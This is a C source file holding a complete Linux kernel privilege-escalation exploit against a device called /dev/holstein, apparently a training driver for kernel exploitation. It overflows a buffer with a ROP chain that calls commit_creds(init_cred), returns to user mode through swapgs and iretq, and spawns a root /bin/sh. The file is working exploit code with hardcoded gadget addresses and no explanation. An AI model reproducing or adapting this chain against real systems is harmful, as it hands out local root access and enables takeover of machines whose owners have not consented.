#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>


#define PREPARE_KERNEL_CRED 0xffffffff8105da53
#define commit_creds 0xffffffff8105db58
#define init_cred 0xffffffff81765f10

#define DEBUG

#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif


uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rsp;
uint64_t user_rip;
uint64_t user_rflags;

void get_shell() {
    if (getuid() != 0) {
        errExit("no root\n");
    }
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    execve("/bin/sh", argv, envp);
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop qword ptr [rip + user_rflags];"
        ".att_syntax prefix;"
    );
    user_rip = (uint64_t)(uintptr_t)get_shell;
}

int main() {
    save_state();
    char payload[0x800];
    uint64_t pop_rdi = 0xffffffff81256a8e;
    uint64_t swapgs = 0xffffffff814f1aeb;
    uint64_t iretq = 0xffffffff8100c3fa;
    uint64_t idx = 0;

    int fd = open("/dev/holstein", O_RDWR);

    if (fd == -1) {
        perror("open");
        return -1;
    }

    memset(payload, 0, sizeof(payload));
    uint64_t *rop = (uint64_t *)(payload + 0x418);
    rop[idx++] = pop_rdi;
    rop[idx++] = init_cred;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs;
    rop[idx++] = iretq;
    rop[idx++] = user_rip;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_rsp;
    rop[idx++] = user_ss;
    if (write(fd, payload, sizeof(payload)) < 0) {
        perror("write");
        return -1;
    } 

    close(fd);
    return 0;
}
